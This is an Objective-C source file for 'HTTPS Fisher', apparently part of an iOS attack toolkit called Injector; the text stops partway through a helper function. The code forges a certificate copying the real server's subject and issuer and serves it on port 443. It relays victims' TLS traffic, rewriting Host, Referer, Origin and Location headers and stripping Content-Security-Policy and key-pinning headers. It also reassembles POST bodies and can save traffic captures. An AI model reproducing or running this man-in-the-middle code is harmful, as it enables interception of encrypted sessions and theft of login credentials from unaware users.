//
//  IJTHTTPSFisher.m
//  IJTHTTPSFisher
//
//  Created by 聲華 陳 on 2015/12/1.
//
//

#import "IJTHTTPSFisher.h"

#import <stdio.h>
#import <unistd.h>
#import <stdlib.h>
#import <memory.h>
#import <errno.h>
#import <sys/types.h>
#import <sys/stat.h>
#import <sys/socket.h>
#import <netinet/in.h>
#import <arpa/inet.h>
#import <netdb.h>
#import <sys/sysctl.h>
#import <ifaddrs.h>

#import <openssl/rsa.h>       /* SSLeay stuff */
#import <openssl/crypto.h>
#import <openssl/x509.h>
#import <openssl/pem.h>
#import <openssl/ssl.h>
#import <openssl/err.h>

#import <pcap.h>

#import "IJTSysctl.h"
#import "IJTOpenSSL.h"

#define ACCEPT_TIMEOUT 1000
#define READ_TIMEOUT 1500 //1.5ms

#define HOME "/var/root/Injector/HTTPS Fisher"

@interface IJTHTTPSFisher ()

@property (atomic, strong) NSString *errorMessage;
@property (atomic) int listen_fd;
@property (atomic) SSL_CTX *ctx;
@property (atomic) in_addr_t redirectAddress;
@property (atomic, strong) NSString *redirectHostname;
@property (atomic) BOOL stopAll;
@property (atomic) BOOL needSave;
@property (atomic, strong) NSString *filterExpression;
@property (atomic) int old1;
@property (atomic) int old2;
@property (atomic) struct rlimit oldLimit;

@property (atomic, strong) NSString *publicKeyPath;
@property (atomic, strong) NSString *privateKeyPath;
@property (atomic, strong) NSString *certPath;
@property (atomic, strong) NSString *outputPath;
@property (atomic, strong) NSString *saveFilename;

@end

@implementation IJTHTTPSFisher

- (id)init {
    self = [super init];
    if(self) {
        //init
        SSL_library_init();
        SSL_load_error_strings();
        OpenSSL_add_all_algorithms();
        _listen_fd = -1;
        _needSave = NO;
        
        //create dir
        struct stat st = {0};
        if (stat(HOME, &st) == -1) {
            mkdir(HOME, 0755);
        }
        
        //increse fork system limit
        _old1 = [IJTSysctl sysctlValueByname:@"kern.maxproc"];
        _old2 = [IJTSysctl sysctlValueByname:@"kern.maxprocperuid"];
        getrlimit(RLIMIT_NPROC, &_oldLimit);
        
        [IJTSysctl increaseTo:4096 name:@"kern.maxproc"];
        [IJTSysctl increaseTo:4096 name:@"kern.maxprocperuid"];
        
        struct rlimit r;
        int limit = [IJTSysctl sysctlValueByname:@"kern.maxproc"];
        r.rlim_cur = limit;
        r.rlim_max = limit;
        
        setrlimit(RLIMIT_NPROC, &r);
        
    }
    return self;
}

- (void)open {
    
    [self close];
    
    /* SSL preliminaries. We keep the certificate and key with the context. */
    char buf[1024];
    int n = 1;
    struct sockaddr_in sa_serv;
    
    if(!_ctx) {
        _ctx = SSL_CTX_new(TLSv1_server_method());
    }
    
    if (!_ctx) {
        self.errorMessage = [NSString stringWithUTF8String:ERR_error_string(ERR_get_error(), buf)];
        errno = 0;
        goto BAD;
    }
    
    if (SSL_CTX_use_certificate_file(_ctx, [_certPath UTF8String], SSL_FILETYPE_PEM) <= 0) {
        self.errorMessage = [NSString stringWithUTF8String:ERR_error_string(ERR_get_error(), buf)];
        errno = 0;
        goto BAD;
    }
    if (SSL_CTX_use_PrivateKey_file(_ctx, [_privateKeyPath UTF8String], SSL_FILETYPE_PEM) <= 0) {
        self.errorMessage = [NSString stringWithUTF8String:ERR_error_string(ERR_get_error(), buf)];
        errno = 0;
        goto BAD;
    }
    
    if (!SSL_CTX_check_private_key(_ctx)) {
        self.errorMessage = @"Private key does not match the certificate public key";
        errno = 0;
        goto BAD;
    }
    
    
    /* ----------------------------------------------- */
    /* Prepare TCP socket for receiving connections */
    if(_listen_fd < 0) {
        _listen_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    }
    if(_listen_fd < 0) {
        goto BAD;
    }
    
    memset (&sa_serv, '\0', sizeof(sa_serv));
    sa_serv.sin_family      = AF_INET;
    sa_serv.sin_addr.s_addr = INADDR_ANY;
    sa_serv.sin_port        = htons (443);          /* Server Port number */
    sa_serv.sin_len = sizeof(sa_serv);
    
    //EADDRINUSE    48      /* Address already in use */
    if(setsockopt(_listen_fd, SOL_SOCKET, SO_REUSEADDR, &n, sizeof(n)) < 0) {
        goto BAD;
    }
    
    if(bind(_listen_fd, (struct sockaddr*) &sa_serv, sizeof (sa_serv)) < 0) {
        goto BAD;
    }
    
    /* Receive a TCP connection. */
    if(listen(_listen_fd, 4096) < 0) {
        goto BAD;
    }
    
    return;
BAD:
    if(errno) {
        self.errorMessage = [NSString stringWithUTF8String:strerror(errno)];
    }
    [self.delegate IJTHTTPSFisherInitSecuritySocketServerFailure:_errorMessage];
    return;
}

- (int)redirectTo: (NSString *)ipAddress hostname: (NSString *)hostname {
    
    _redirectAddress = 0;
    
    if (inet_pton(AF_INET, [ipAddress UTF8String], &_redirectAddress) != 1) { //ip address
        goto BAD;
    }
    
    self.redirectHostname = [NSString stringWithString:hostname];
    
    return 0;
BAD:
    return -1;
}

- (void)dealloc {
    //set back
    [IJTSysctl sysctlSetValue:_old1 name:@"kern.maxproc"];
    [IJTSysctl sysctlSetValue:_old2 name:@"kern.maxprocperuid"];
    setrlimit(RLIMIT_NPROC, &_oldLimit);
    [self close];
}

- (void)close {
    if(_listen_fd >= 0) {
        close(_listen_fd);
        _listen_fd = -1;
    }
    if(_ctx) {
        SSL_CTX_free(_ctx);
        _ctx = NULL;
    }
}

- (void)generateSSLKey {
    
    [self.delegate IJTHTTPSFisherGeneratingSSLKey];
    
    
    //open redirect socket
    struct sockaddr_in sa;
    SSL *re_ssl = NULL;
    SSL_CTX *re_ctx = NULL;
    int n = 1;
    char buf[4096];
    int re_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(re_fd < 0) {
        goto BAD;
    }
    
    if(setsockopt(re_fd, SOL_SOCKET, SO_REUSEADDR, &n, sizeof(n)) < 0)
        goto BAD;
    
    memset(&sa, 0, sizeof(sa));
    sa.sin_family      = AF_INET;
    sa.sin_addr.s_addr = _redirectAddress;   /* Server IP */
    sa.sin_port        = htons(443);          /* Server Port number */
    
    if(connect(re_fd, (struct sockaddr*) &sa, sizeof(sa)) < 0)
        goto BAD;
    
    re_ctx = SSL_CTX_new(TLSv1_server_method());
    if(!re_ctx) {
        self.errorMessage = [NSString stringWithUTF8String:ERR_error_string(ERR_get_error(), buf)];
        errno = 0;
        goto BAD;
    }
    re_ssl = SSL_new (re_ctx);
    if(!re_ssl) {
        self.errorMessage = [NSString stringWithUTF8String:ERR_error_string(ERR_get_error(), buf)];
        errno = 0;
        goto BAD;
    }
    SSL_set_fd (re_ssl, re_fd);
    
    if(SSL_connect(re_ssl) < 0) {
        self.errorMessage = [NSString stringWithUTF8String:ERR_error_string(ERR_get_error(), buf)];
        errno = 0;
        goto BAD;
    }
    
    X509 *server_cert = SSL_get_peer_certificate(re_ssl);
    X509_NAME *subject = NULL;
    X509_NAME *issuser = NULL;
    if(server_cert != NULL) {
        char *str = NULL;
        NSString *cipher = [NSString stringWithUTF8String:SSL_get_cipher(re_ssl)];
        subject = X509_get_subject_name(server_cert);
        str = X509_NAME_oneline(subject, 0, 0);
        NSString *subjectString = [NSString stringWithUTF8String:str];
        free (str);
        issuser = X509_get_issuer_name(server_cert);
        str = X509_NAME_oneline(issuser, 0, 0);
        NSString *issuserString = [NSString stringWithUTF8String:str];
        free (str);
        
        [self.delegate IJTHTTPSFisherServerCertificateUsing:cipher subject:subjectString issuer:issuserString];
    }//end if
    
    int ret =
    [IJTOpenSSL generateCertificatePath:_certPath
                          publicKeyPath:_publicKeyPath
                         privateKeyPath:_privateKeyPath
                               hostname:_redirectHostname
                                subject:subject
                                issuser:issuser];
    //clear server
    if(server_cert) {
        X509_free(server_cert);
    }
    SSL_CTX_free(re_ctx);
    SSL_free(re_ssl);
    close(re_fd);
    
    if(ret == -1) {
        [self.delegate IJTHTTPSFisherGeneratedSSLKeyFailure];
    }
    else if(ret == 0) {
        NSString *public = [[NSString alloc] initWithContentsOfFile:_publicKeyPath encoding:NSUTF8StringEncoding error:nil];
        NSString *private = [[NSString alloc] initWithContentsOfFile:_privateKeyPath encoding:NSUTF8StringEncoding error:nil];
        NSString *certificate = [[NSString alloc] initWithContentsOfFile:_certPath encoding:NSUTF8StringEncoding error:nil];
        [self.delegate IJTHTTPSFisherGeneratedCertificate:certificate publicKey:public privateKey:private];
    }
    return;
BAD:
    if(errno == 0) {
        [self.delegate IJTHTTPSFisherRetrieveRedirectHostCertificateFailure:_errorMessage];
    }
}

- (void)setNeedSavefileAndFilter: (NSString *)filter {
    _needSave = YES;
    _filterExpression = [NSString stringWithString:filter];
}

- (void)createOutputPath {
    struct stat st = {0};
    
    NSDate *date = [[NSDate alloc] initWithTimeIntervalSinceNow:0];
    NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
    dateFormatter.locale = [[NSLocale alloc] initWithLocaleIdentifier:@"en_US"];
    [dateFormatter setDateFormat:@"y-MM-dd HH-mm-ss"];
    NSString *time = [dateFormatter stringFromDate:date];
    _outputPath = [NSString stringWithFormat:@"%s/%s", HOME, [time UTF8String]];
    if (stat([_outputPath UTF8String], &st) == -1) {
        mkdir([_outputPath UTF8String], 0755);
    }
    
    _saveFilename = [NSString stringWithFormat:@"%@/HTTPSPacket@%@.pcap", _outputPath, currentIPAddress()];
    _publicKeyPath = [NSString stringWithFormat:@"%@/public.pem", _outputPath];
    _privateKeyPath = [NSString stringWithFormat:@"%@/private.pem", _outputPath];
    _certPath = [NSString stringWithFormat:@"%@/cert.pem", _outputPath];
}

- (void)savePacket {
    pcap_t *handle = NULL;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program bpf_filter;
    bpf_u_int32 net_mask;
    bpf_u_int32 net_ip;
    char *device = "en0";
    struct pcap_pkthdr *header = NULL;
    const u_char *content = NULL;
    pcap_dumper_t *dumpfile = NULL;
    
    handle = pcap_open_live(device, 65535, 1, 1000, errbuf);
    if (!handle) {
        self.errorMessage = [NSString stringWithUTF8String:errbuf];
        goto BAD;
    }
    if (pcap_datalink(handle) != DLT_EN10MB) {
        self.errorMessage = @"It is not ethernet.";
        pcap_close(handle);
        goto BAD;
    }
    
    if(-1 == pcap_lookupnet(device, &net_ip, &net_mask, errbuf)) {
        self.errorMessage = [NSString stringWithUTF8String:errbuf];
        pcap_close(handle);
        goto BAD;
    }
    
    if(-1 == pcap_compile(handle, &bpf_filter, [_filterExpression UTF8String], 0, net_ip)) {
        self.errorMessage = [NSString stringWithUTF8String:pcap_geterr(handle)];
        pcap_close(handle);
        goto BAD;
    }
    
    if(-1 == pcap_setfilter(handle, &bpf_filter)) {
        self.errorMessage = [NSString stringWithUTF8String:pcap_geterr(handle)];
        pcap_close(handle);
        goto BAD;
    }
    pcap_freecode(&bpf_filter);
    
    dumpfile = pcap_dump_open(handle, [_saveFilename UTF8String]);
    if(!dumpfile) {
        self.errorMessage = [NSString stringWithUTF8String:pcap_geterr(handle)];
        pcap_close(handle);
        goto BAD;
    }
    
    while(1) {
        if(_stopAll)
            break;
        int ret = pcap_next_ex(handle, &header, &content);
        if(ret == 1) {
            pcap_dump((u_char *)dumpfile, header, content);
            pcap_dump_flush(dumpfile);
        }
        else if(ret == -1) {
            [self.delegate IJTHTTPSFisherSaveToFileFailure:_errorMessage];
        }
    }//end while read
    
    pcap_dump_close(dumpfile);
    pcap_close(handle);
    [self.delegate IJTHTTPSFisherSaveToFileDone:_saveFilename outputLocation:_outputPath];
    return;
BAD:
    [self.delegate IJTHTTPSFisherSaveToFileFailure:_errorMessage];
    return;
}

- (void)start {
    
    [self createOutputPath];
    
    [self generateSSLKey];
    
    [self open];
    
    struct sockaddr_in sa_cli;
    size_t client_len;
    int client_fd;
    NSThread *saveThread = [[NSThread alloc] initWithTarget:self selector:@selector(savePacket) object:nil];
    
    _stopAll = NO;
    
    if(_needSave) {
        [saveThread start];
        [self.delegate IJTHTTPSFisherSavePacketFilename:_saveFilename];
    }
    
    [self.delegate IJTHTTPSFisherServerStart];
    
    while(1 && !_stopAll) {
        int n;
        fd_set readfd;
        struct timespec tv = {};
        tv.tv_sec = ACCEPT_TIMEOUT / 1000;
        tv.tv_nsec = ACCEPT_TIMEOUT % 1000 * 1000;
        
        FD_ZERO(&readfd);
        FD_SET(_listen_fd, &readfd);
        if((n = pselect(_listen_fd + 1, &readfd, NULL, NULL, &tv, NULL)) < 0)
            break; //fail
        if(n == 0) {
            if(_stopAll)
                break;
            else
                continue;
        }
        
        if(_stopAll)
            break;
        
        if(!FD_ISSET(_listen_fd, &readfd))
            continue;
        
        client_len = sizeof(sa_cli);
        if((client_fd = accept(_listen_fd, (struct sockaddr *)&sa_cli, (socklen_t *)&client_len)) < 0) {
            [self.delegate IJTHTTPSFisherAcceptClientFailure:[NSString stringWithUTF8String:strerror(errno)]];
            break;
        }
        
        NSArray *object = @[@(client_fd), [NSValue value:&sa_cli withObjCType:@encode(struct sockaddr_in)]];
        [NSThread detachNewThreadSelector:@selector(doClientThread:) toTarget:self withObject:object];
        /*
        pid_t pid = fork();
        if(pid == 0) {
            SSL_library_init();
            OpenSSL_add_ssl_algorithms();
            SSL_load_error_strings();
            
            [self doClient:client_fd client_addr:sa_cli];
            exit(0);
        }
        else if(pid < 0) { //can't fork, fine. I try thread
            if(self.delegate) {
                [self.delegate IJTHTTPSFisherForkFailure:[NSString stringWithUTF8String:strerror(errno)]];
            }
            NSArray *object = @[@(client_fd), [NSValue value:&sa_cli withObjCType:@encode(struct sockaddr_in)]];
            [NSThread detachNewThreadSelector:@selector(doClientThread:) toTarget:self withObject:object];
        }//end else
        */
    }//end while
    
    [self.delegate IJTHTTPSFisherServerStop];
    
    return;
}

- (void)doClientThread: (id)object {
    NSArray *array = object;
    NSNumber *fd = [array objectAtIndex:0];
    NSValue *value = [array objectAtIndex:1];
    struct sockaddr_in client_addr;
    [value getValue:&client_addr];
    [self doClient:[fd intValue] client_addr:client_addr];
}

- (void)doClient: (int)client_fd client_addr: (struct sockaddr_in)client_addr {
    
    int n = 1;
    SSL *ssl = NULL;
    int re_fd = -1;
    struct sockaddr_in sa;
    SSL *re_ssl = NULL;
    SSL_CTX *re_ctx = NULL;
    NSMutableArray *clientObjects = [[NSMutableArray alloc] init];
    NSMutableArray *serverObjects = [[NSMutableArray alloc] init];
    NSThread *clientThread = nil;
    NSThread *serverThread = nil;
    char buf[1024];
    char ntop_buf[256];
    
    inet_ntop(AF_INET, &client_addr.sin_addr, ntop_buf, sizeof(ntop_buf));
    
    [self.delegate IJTHTTPSFisherClientConnectionEstablishedIpAddress:[NSString stringWithUTF8String:ntop_buf]
                                                                 port:ntohs(client_addr.sin_port)];
    
    setsockopt(client_fd, SOL_SOCKET, SO_REUSEADDR, &n, sizeof(n));
    
    /* ----------------------------------------------- */
    /* TCP connection is ready. Do server side SSL. */
    ssl = SSL_new(_ctx);
    if(!ssl) {
        self.errorMessage = [NSString stringWithUTF8String:ERR_error_string(ERR_get_error(), buf)];
        errno = 0;
        goto BAD;
    }
    SSL_set_fd (ssl, client_fd);
    if(SSL_accept(ssl) < 0) {
        self.errorMessage = [NSString stringWithUTF8String:ERR_error_string(ERR_get_error(), buf)];
        errno = 0;
        goto BAD;
    }
    
    //certificate information
    X509 *client_cert = SSL_get_peer_certificate(ssl);
    if (client_cert != NULL) {
        char *str = NULL;
        NSString *cipher = [NSString stringWithUTF8String:SSL_get_cipher(ssl)];
        str = X509_NAME_oneline(X509_get_subject_name(client_cert), 0, 0);
        NSString *subject = [NSString stringWithUTF8String:str];
        free (str);
        str = X509_NAME_oneline(X509_get_issuer_name(client_cert), 0, 0);
        NSString *issuser = [NSString stringWithUTF8String:str];
        free (str);
        X509_free(client_cert);
        
        [self.delegate IJTHTTPSFisherClientCertificateUsing:cipher subject:subject issuer:issuser];
    }//end if
    
    
    //open redirect socket
    re_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(re_fd < 0) {
        goto BAD;
    }
    
    if(setsockopt(re_fd, SOL_SOCKET, SO_REUSEADDR, &n, sizeof(n)) < 0)
        goto BAD;
    
    memset(&sa, 0, sizeof(sa));
    sa.sin_family      = AF_INET;
    sa.sin_addr.s_addr = _redirectAddress;   /* Server IP */
    sa.sin_port        = htons(443);          /* Server Port number */
    
    if(connect(re_fd, (struct sockaddr*) &sa, sizeof(sa)) < 0)
        goto BAD;
    
    re_ctx = SSL_CTX_new(SSLv23_client_method());
    if(!re_ctx) {
        self.errorMessage = [NSString stringWithUTF8String:ERR_error_string(ERR_get_error(), buf)];
        errno = 0;
        goto BAD;
    }
    re_ssl = SSL_new (re_ctx);
    if(!re_ssl) {
        self.errorMessage = [NSString stringWithUTF8String:ERR_error_string(ERR_get_error(), buf)];
        errno = 0;
        goto BAD;
    }
    SSL_set_fd (re_ssl, re_fd);
    
    if(SSL_connect(re_ssl) < 0) {
        self.errorMessage = [NSString stringWithUTF8String:ERR_error_string(ERR_get_error(), buf)];
        errno = 0;
        goto BAD;
    }
    
    /* DATA EXCHANGE - Receive message and send reply. */
    [clientObjects addObject:@(client_fd)];
    [clientObjects addObject:[NSValue value:&ssl withObjCType:@encode(SSL *)]];
    [clientObjects addObject:[NSValue value:&re_ssl withObjCType:@encode(SSL *)]];
    [clientObjects addObject:@(YES)];
    
    [serverObjects addObject:@(re_fd)];
    [serverObjects addObject:[NSValue value:&re_ssl withObjCType:@encode(SSL *)]];
    [serverObjects addObject:[NSValue value:&ssl withObjCType:@encode(SSL *)]];
    [serverObjects addObject:@(NO)];
    
    clientThread = [[NSThread alloc] initWithTarget:self selector:@selector(dataExchangeThread:) object:clientObjects];
    serverThread = [[NSThread alloc] initWithTarget:self selector:@selector(dataExchangeThread:) object:serverObjects];
    
    [clientThread start];
    [serverThread start];
    
    //join
    while(![clientThread isFinished]) {
        usleep(100);
    }
    while(![serverThread isFinished]) {
        usleep(100);
    }
    
    [self.delegate IJTHTTPSFisherClientConnectionClosedIpAddress:[NSString stringWithUTF8String:ntop_buf]
                                                            port:ntohs(client_addr.sin_port)];
    
    if(client_fd >= 0) {
        close(client_fd);
    }
    if(ssl) {
        SSL_free(ssl);
    }
    if(re_ssl) {
        SSL_free(re_ssl);
    }
    if(re_ctx) {
        SSL_CTX_free(re_ctx);
    }
    if(re_fd >= 0) {
        close(re_fd);
    }
    
    return;
BAD:
    if(errno) {
        self.errorMessage = [NSString stringWithUTF8String:strerror(errno)];
    }
    [self.delegate IJTHTTPSFisherClientConnectionClosedIpAddress:[NSString stringWithUTF8String:ntop_buf]
                                                            port:ntohs(client_addr.sin_port)];
    [self.delegate IJTHTTPSFisherHandleClientFailure:self.errorMessage];
    if(client_fd >= 0) {
        close(client_fd);
    }
    if(ssl) {
        SSL_free(ssl);
    }
    if(re_ssl) {
        SSL_free(re_ssl);
    }
    if(re_ctx) {
        SSL_CTX_free(re_ctx);
    }
    if(re_fd >= 0) {
        close(re_fd);
    }
    
    return;
}

- (void)dataExchangeThread: (id)object {
    NSArray *objects = (NSArray *)object;
    NSNumber *fd = [objects objectAtIndex:0];
    NSValue *value = [objects objectAtIndex:1];
    SSL *fromSSL = NULL;
    [value getValue:&fromSSL];
    SSL *toSSL = NULL;
    value = [objects objectAtIndex:2];
    [value getValue:&toSSL];
    NSNumber *senderIsClient = [objects objectAtIndex:3];
    
    [self dataExchange:[fd intValue] fromSSL:fromSSL toSSL:toSSL senderIsClient:[senderIsClient boolValue]];
}

- (void)dataExchange: (int)fd fromSSL: (SSL *)fromSSL toSSL: (SSL *)toSSL senderIsClient: (BOOL)senderIsClient {
    
    BOOL containHeaderData = YES;
    char rebuildPacket[65535] = {};
    int contentLength = 0;
    int remainContentLength = 0;
    int currentLength = 0;
    
    while(1) {
        int n;
        fd_set readfd;
        struct timespec tv = {};
        tv.tv_sec = READ_TIMEOUT / 1000;
        tv.tv_nsec = READ_TIMEOUT % 1000 * 1000;
        char read_buffer[4096] = {};
        int bytes = 0;
        int length = 0;
        
        FD_ZERO(&readfd);
        FD_SET(fd, &readfd);
        if((n = pselect(fd + 1, &readfd, NULL, NULL, &tv, NULL)) < 0)
            goto BAD;
        if(n == 0) {
            break;
        }
        
        if(_stopAll || _ctx == NULL)
            break;
        
        if(!FD_ISSET(fd, &readfd))
            continue;
        
        bytes = SSL_read(fromSSL, read_buffer, sizeof(read_buffer));
        if(bytes == 0) {
            if(_stopAll || _ctx == NULL)
                break;
            else
                continue;
        }
        else if(bytes == -1) {
            errno = ECONNREFUSED;
            break;
        }
        
        BOOL change = NO;
        //start replace data
        if(senderIsClient) {
            [self.delegate IJTHTTPSFisherClientSentData:read_buffer length:bytes];
            if([self modifySendToServerData:read_buffer length:sizeof(read_buffer) change:&change] == -1)
                goto BAD;
            
        }//end if is from client
        else {
            [self.delegate IJTHTTPSFisherServerSentData:read_buffer length:bytes];
            if([self modifySendToClientData:read_buffer length:sizeof(read_buffer) change:&change] == -1)
                goto BAD;
        }//end else if from server
        
        length = change ? (int)strlen(read_buffer) : bytes;
        if(senderIsClient) {
            [self.delegate IJTHTTPSFisherSendToServerData:read_buffer
                                                   length:length
                                                   modify:change];
        }
        else {
            [self.delegate IJTHTTPSFisherSendToClientData:read_buffer
                                                   length:length
                                                   modify:change];
        }
        
        
        //rebuilt post packet
        if(containHeaderData && !strncmp(read_buffer, "POST ", 4)) {
            
            char *contentLengthPtr = strstr(read_buffer, "Content-Length: ");
            char *headerEnd = strstr(read_buffer, "\r\n\r\n");
            int headerlength = 0;
            currentLength = 0;
            remainContentLength = 0;
            
            if(headerEnd) {
                memset(rebuildPacket, 0, sizeof(rebuildPacket));
                memcpy(rebuildPacket, read_buffer, length);
                currentLength = length;
                for(char *tmp = read_buffer; tmp != headerEnd ; tmp++) {
                    headerlength++;
                }//end for
                headerlength += strlen("\r\n\r\n");
            }//end if
            
            if(contentLengthPtr) {
                contentLengthPtr += strlen("Content-Length: ");
                contentLength = atoi(contentLengthPtr);
                if(contentLength != 0) {
                    remainContentLength = contentLength - (length - headerlength);
                    containHeaderData = NO;
                }
            }//end if
        }//end if
        else if(!containHeaderData) {
            remainContentLength -= length;
            memcpy(rebuildPacket + currentLength, read_buffer, length);
            currentLength += length;
            if(remainContentLength <= 0) {
                rebuildPacket[currentLength] = 0;
                containHeaderData = YES;
                
                [self.delegate IJTHTTPSFisherReceivePOSTData:rebuildPacket length:currentLength];
            }
        }//end else
        
        
        
        bytes = SSL_write(toSSL, read_buffer, length);
        if(bytes == -1) {
            errno = ECONNREFUSED;
            break;
        }
    }//end while read
    
    
    return;
BAD:
    self.errorMessage = [NSString stringWithUTF8String:strerror(errno)];
    [self.delegate IJTHTTPSFisherExchangeDataFailure:self.errorMessage];
    return;
}

- (void)stop {
    _stopAll = YES;
    if(!_needSave) {
        remove([_publicKeyPath UTF8String]);
        remove([_privateKeyPath UTF8String]);
        remove([_certPath UTF8String]);
        remove([_outputPath UTF8String]);
    }
}

+ (void)decodeNSData: (char *)data length: (int)length HTTPHeader: (NSArray **)header HTTPBody: (NSString **)body {
    
    NSString *rawdata = [[NSString alloc] initWithBytes:data length:length encoding:NSUTF8StringEncoding];
    NSUInteger httpBodyLocation = [rawdata rangeOfString:@"\r\n\r\n"].location;
    NSString *httpRawHeader = @"";
    NSArray *httpHeader = nil;
    
    if(httpBodyLocation == NSNotFound) {
        if(body)
            *body = [[NSString alloc] initWithBytes:data length:length encoding:NSUTF8StringEncoding];
        if(header)
            *header = nil;
        return;
    }//end if not found
    
    httpRawHeader = [rawdata substringWithRange:NSMakeRange(0, httpBodyLocation)];
    httpHeader = [httpRawHeader componentsSeparatedByString:@"\r\n"];
    if(httpHeader.count <= 0) {
        if(body)
            *body = [[NSString alloc] initWithBytes:data length:length encoding:NSUTF8StringEncoding];
        if(header)
            *header = nil;
        return;
    }//end if not contain any data
    
    if([[httpHeader firstObject] containsString:@"HTTP/1"]) { //first line contain HTTP/1
        if(header)
            *header = httpHeader;
        NSUInteger location = httpBodyLocation + (NSUInteger)strlen("\r\n\r\n");
        if(body)
            *body = [rawdata substringWithRange:NSMakeRange(location, length - location)];
        return;
    }
    
    //can't decode
    if(header)
        *header = nil;
    if(body)
        *body = [[NSString alloc] initWithBytes:data length:length encoding:NSUTF8StringEncoding];
}

+ (NSString *)httpPost2string: (NSString *)post {
    //http://en.wikipedia.org/wiki/Percent-encoding
    NSString *output = [NSString stringWithString:post];
    NSArray *key =
    @[@"%20", @"%21", @"%22",
      @"%23", @"%24", @"%25",
      @"%26", @"%27", @"%28",
      @"%29", @"%2A", @"%2B",
      @"%2C", @"%2D", @"%2E",
      @"%2F", @"%3A", @"%3B",
      @"%3C", @"%3D", @"%3E",
      @"%3F", @"%40", @"%5B",
      @"%5C", @"%5D", @"%5E",
      @"%5F", @"%60", @"%7B",
      @"%7C", @"%7D", @"%7E",
      @"%80"];
    NSArray *value =
    @[@" ", @"!", @"\"",
      @"#", @"$", @"%",
      @"&", @"\'", @"(",
      @")", @"*", @"+",
      @",", @"-", @".",
      @"/", @":", @";",
      @"<", @"=", @">",
      @"?", @"@", @"[",
      @"\\", @"]", @"^",
      @"_", @"`", @"{",
      @"|", @"}", @"~",
      @"`"];
    for(int i = 0 ; i < key.count ; i++) {
        output = [output stringByReplacingOccurrencesOfString:key[i] withString:value[i]];
    }
    
    return output;
}

- (int)modifySendToClientData: (char *)read_buffer length: (int)length change: (BOOL *)change  {
    char *tmp = NULL;
    char replace[4096] = {};
    char *modifydata = NULL;
    
    //replace location
    tmp = strstr(read_buffer, "Location: https://");
    if(tmp) {
        *change = YES;
        tmp += strlen("Location: https://");
        memset(replace, 0, sizeof(replace));
        for(int i = 0 ; ;i++, tmp++) {
            if(*tmp != '\r' && *tmp != '\n' && *tmp != '/') {
                replace[i] = *tmp;
            }
            else {
                break;
            }
        }//end for get chars to newline
        
        modifydata = str_replace(read_buffer,
                                 replace,
                                 [currentIPAddress() UTF8String]);
        if(!modifydata) {
            goto BAD;
        }
        
        memset(read_buffer, 0, length);
        strncpy(read_buffer, modifydata, strlen(modifydata));
        free(modifydata);
    }//end if found location
    
    //remove Content-Security-Policy
    tmp = strstr(read_buffer, "Content-Security-Policy: ");
    if(tmp) {
        *change = YES;
        memset(replace, 0, sizeof(replace));
        for(int i = 0 ; ;i++, tmp++) {
            if(*tmp != '\r' && *tmp != '\n') {
                replace[i] = *tmp;
            }
            else {
                break;
            }
        }//end for get chars to newline
        strlcat(replace, "\r\n", sizeof(replace));
        
        removeSubstring(read_buffer, replace);
    }//end if found content-security-policy
    /*
     //remove set-cookie
     while((tmp = strstr(read_buffer, "Set-Cookie: "))) {
     *change = YES;
     memset(replace, 0, sizeof(replace));
     for(int i = 0 ; ;i++, tmp++) {
     if(*tmp != '\r' && *tmp != '\n') {
     replace[i] = *tmp;
     }
     else {
     break;
     }
     }//end for get chars to newline
     strlcat(replace, "\r\n", sizeof(replace));
     
     removeSubstring(read_buffer, replace);
     }//end while found set-cookie
     */
    //remove Public-Key-Pins-Report-Only
    tmp = strstr(read_buffer, "Public-Key-Pins-Report-Only: ");
    if(tmp) {
        *change = YES;
        memset(replace, 0, sizeof(replace));
        for(int i = 0 ; ;i++, tmp++) {
            if(*tmp != '\r' && *tmp != '\n') {
                replace[i] = *tmp;
            }
            else {
                break;
            }
        }//end for get chars to newline
        strlcat(replace, "\r\n", sizeof(replace));
        
        removeSubstring(read_buffer, replace);
    }//end if found Public-Key-Pins-Report-Only
    
    return 0;
BAD:
    return -1;
}

- (int)modifySendToServerData: (char *)read_buffer length: (int)length change: (BOOL *)change {
    char *tmp = NULL;
    char replace[4096] = {};
    char *modifydata = NULL;
    
    //replace host
    tmp = strstr(read_buffer, "Host: ");
    if(tmp) {
        *change = YES;
        memset(replace, 0, sizeof(replace));
        for(int i = 0 ; ;i++, tmp++) {
            if(*tmp != '\r' && *tmp != '\n') {
                replace[i] = *tmp;
            }
            else {
                break;
            }
        }//end for get chars to newline
        modifydata = str_replace(read_buffer,
                                 replace,
                                 [[NSString stringWithFormat:@"Host: %@", _redirectHostname] UTF8String]);
        if(!modifydata) {
            goto BAD;
        }
        
        memset(read_buffer, 0, length);
        strncpy(read_buffer, modifydata, strlen(modifydata));
        free(modifydata);
    }//end if found host
    
    
    //replace referer
    tmp = strstr(read_buffer, "Referer: https://");
    if(tmp) {
        *change = YES;
        tmp += strlen("Referer: https://");
        memset(replace, 0, sizeof(replace));
        for(int i = 0 ; ;i++, tmp++) {
            if(*tmp != '\r' && *tmp != '\n' && *tmp != '/') {
                replace[i] = *tmp;
            }
            else {
                break;
            }
        }//end for get chars to newline
        
        modifydata = str_replace(read_buffer,
                                 replace,
                                 [_redirectHostname UTF8String]);
        if(!modifydata) {
            goto BAD;
        }
        
        memset(read_buffer, 0, length);
        strncpy(read_buffer, modifydata, strlen(modifydata));
        free(modifydata);
    }//end if found referer
    
    
    //replace Origin
    tmp = strstr(read_buffer, "Origin: https://");
    if(tmp) {
        *change = YES;
        tmp += strlen("Origin: https://");
        memset(replace, 0, sizeof(replace));
        for(int i = 0 ; ;i++, tmp++) {
            if(*tmp != '\r' && *tmp != '\n' && *tmp != '/') {
                replace[i] = *tmp;
            }
            else {
                break;
            }
        }//end for get chars to newline
        
        modifydata = str_replace(read_buffer,
                                 replace,
                                 [_redirectHostname UTF8String]);
        if(!modifydata) {
            goto BAD;
        }
        
        memset(read_buffer, 0, length);
        strncpy(read_buffer, modifydata, strlen(modifydata));
        free(modifydata);
    }//end if found Origin
    
    return 0;
BAD:
    return -1;
}


static void removeSubstring(char *s, const char *toremove) {
    while((s = strstr(s,toremove)))
        memmove(s, s + strlen(toremove), 1 + strlen(s + strlen(toremove)));
}

static char *str_replace(char *orig, const char *rep, const char *with) {
    char *result; // the return string
    char *ins;    // the next insert point
    char *tmp;    // varies
    int len_rep;  // length of rep
    int len_with; // length of with
